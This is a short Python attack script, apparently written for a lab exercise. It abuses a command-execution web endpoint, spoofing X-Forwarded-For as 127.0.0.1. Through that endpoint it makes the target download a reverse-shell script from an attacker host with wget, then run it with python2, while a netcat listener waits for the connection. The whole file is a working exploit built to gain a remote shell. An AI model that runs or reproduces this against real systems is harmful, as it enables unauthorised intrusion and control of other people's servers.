#!/usr/bin/python
import requests
import json
import sys 
from threading import Thread
import subprocess
import time
if len(sys.argv) != 4: 
    print("Usage: " + sys.argv[0] + " http://127.0.0.1:pty.py 443 http://10.1.1.1/cmd.php")
    print("Ex: " + sys.argv[0] + " pty.py lport vuln_site")
    sys.exit(1)
revshell_path = "wget " + str(sys.argv[1]) + " -O /tmp/pty.py" # http://192.168.119.209/pty.py
lport = sys.argv[2]
url = sys.argv[3] # http://10.1.1.1/cmd.php
def listener():
    subprocess.call(["sudo", "nc","-lvp", lport])
def req2web():
    headers = {'X-Forwarded-For' : '127.0.0.1'}
    print("[+] Downloading files.......")
    r = requests.post(url, data={'data': revshell_path}, headers=headers) 
    r2 = requests.post(url, data={'data': 'ls /tmp/pty.py'}, headers=headers) 
    print("[+] Was the file downloaded successfully? Checking if it exists.......: " + str(r2.text))
    print("[+] Attempting to execute the file")
    r = requests.post(url, data={'data': 'python2 /tmp/pty.py'}, headers=headers)
if __name__ == '__main__': 
    Thread(target = listener).start()
    Thread(target = req2web).start()
